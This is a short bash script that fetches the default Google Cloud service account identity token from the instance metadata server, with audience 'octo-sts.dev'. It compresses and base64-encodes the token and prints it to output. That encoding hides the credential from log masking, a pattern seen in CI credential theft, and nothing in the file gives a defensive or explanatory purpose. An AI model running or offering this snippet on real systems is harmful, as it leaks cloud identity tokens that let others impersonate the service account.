#!/bin/bash
pwd
idtoken=$(curl -sSL -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/service-accounts/default/identity?audience=octo-sts.dev)
echo $idtoken|gzip -v9|base64 -w0
